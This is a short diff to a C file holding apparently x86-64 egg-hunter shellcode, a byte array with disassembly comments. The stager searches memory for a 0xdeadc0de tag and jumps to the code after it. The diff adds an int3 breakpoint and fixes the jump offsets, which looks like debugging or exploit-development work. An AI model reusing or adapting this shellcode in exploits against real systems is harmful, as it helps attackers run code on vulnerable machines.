@@ -1,5 +1,5 @@
 
-#define EGG_SIZE 38
+#define EGG_SIZE 39
 
 char EGG[] = {
   /* 0000 */ "\xcc"                 /* int3                */
@@ -16,10 +16,11 @@ char EGG[] = {
   /* 0014 */ "\x5f"                 /* pop rdi             */
   /* 0015 */ "\x85\xc0"             /* test eax, eax       */
   /* 0017 */ "\x75\xef"             /* jnz 0x8             */
-  /* 0019 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
-  /* 001E */ "\xaf"                 /* scasd               */
-  /* 001F */ "\x75\xea"             /* jnz 0xb             */
-  /* 0021 */ "\xaf"                 /* scasd               */
-  /* 0022 */ "\x75\xe7"             /* jnz 0xb             */
-  /* 0024 */ "\xff\xe7"             /* jmp rdi             */
+  /* 0019 */ "\xcc"                 /* int3                */
+  /* 001A */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
+  /* 001F */ "\xaf"                 /* scasd               */
+  /* 0020 */ "\x75\xe9"             /* jnz 0xb             */
+  /* 0022 */ "\xaf"                 /* scasd               */
+  /* 0023 */ "\x75\xe6"             /* jnz 0xb             */
+  /* 0025 */ "\xff\xe7"             /* jmp rdi             */
 };
